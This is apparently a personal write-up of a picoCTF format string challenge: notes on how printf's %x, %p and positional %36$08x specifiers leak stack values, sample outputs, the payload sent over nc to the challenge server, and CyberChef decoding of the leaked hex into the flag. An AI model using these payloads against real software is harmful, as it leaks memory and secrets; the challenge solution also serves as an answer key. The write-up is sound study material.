# Lesson  
- Format String Attack  
  - vulnerability of `printf()` and the kind of the function of `c`  
    "%x" and "%p" can extract a value on stack.  
    - input examples
      ```
      # simple
      %x%x%x%x
      > ffaa0340f7d7f374804934678257825

      %X%X%X%X
      > FF8F8700F7D7D374804934658255825

      %p%p%p%p
      > 0xffac59600xf7ce93740x80493460x70257025

      # beautify with some characters as delimeter
      %x.%x***%x
      > ffc56130.f7d03374***8049346

      # padding
      > %08x.%08x.%08x
      ffbb0560.f7d61374.08049346

      > %x.%x.%x
      ffe1ae40.f7cf2374.8049346

      # select stack index
      %36$p.%37$p.%38$p.%39$p
      > 0x6620796d.0x2067616c.0x68616579.0xa686868

      %p.%p.%p.%p
      > 0xffb54580.0xf7c99374.0x8049346.0x252e7025

      # select stack index and padding
      %36$08x.%37$08x.%38$08x.%39$08x
      > 6620796d.2067616c.68616579.0a686868
      ```
  - https://zenn.dev/ri5255/scraps/852f4e4a26965c  
  - https://note.com/zk_phi/n/nc77f077017d7

# Memo
1. prepare a flag file for local test 
    ```zsh
    $ touch flag.txt
    $ echo "my flag yeahhhh" > flag.txt
    ```

2. test on local  
    The content of my flag is described like this.  
    ```
    my flag yeahhhh
    6d 79 20 66 6c 61 67 20 79 65 61 68 68 68 68
    ```
    I can't find the flag hex at the beginning.
    ```
    %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
    > ffd064f0.f7ccd374.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78.f7f45000.8048338.804c034.d.f7f45000
    ```
    Then I found the hex strings around "$ESP + 36 * 4 byte".  
    However the input size is limited, so I save the number of input characters like this.  
    For the next decoding, I also add padding characters - "08".  
    ```
    %36$08x.%37$08x.%38$08x.%39$08x.%40$08x.%41$08x.%42$08x.%43$08x.%44$08x.%45$08x.%46$08x.%47$08x.%48$08x
    > 6620796d.2067616c.68616579.0a686868.f7d08e00.0804c000.fff57d24.f7f84b80.fff57c58.f7f61004.f7f269b4.b758cf00.000003e8
    ```

3. test decode with `CyberChef`  
    [recipe](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,false)From_Hex('Auto')&input=NjYyMDc5NmQuMjA2NzYxNmMuNjg2MTY1NzkuMGE2ODY4NjguZjdkMDhlMDAuMDgwNGMwMDAuZmZmNTdkMjQuZjdmODRiODAuZmZmNTdjNTguZjdmNjEwMDQuZjdmMjY5YjQuYjc1OGNmMDAuMDAwMDAzZTg)

4. exploit
    ```zsh
    $ nc saturn.picoctf.net 57404
    Tell me a story and then I'll tell you one >> %36$08x.%37$08x.%38$08x.%39$08x.%40$08x.%41$08x.%42$08x.%43$08x.%44$08x.%45$08x.%46$08x.%47$08x.%48$08x
    Here's a story -
    6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.395f6b63.30366635.7d373136.fbad2000.2146c300.00000000
    ```

5. decode with `CyberChef`  
    [recipe](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,false)From_Hex('Auto')&input=NmY2MzY5NzAuN2I0NjU0NDMuNmIzNDMzNGMuNWY2NzZlMzEuNjczNDZjNDYuNjY2NjMwNWYuMzQ3NDUzNWYuMzk1ZjZiNjMuMzAzNjY2MzUuN2QzNzMxMzYuZmJhZDIwMDAuMjE0NmMzMDAuMDAwMDAwMDA)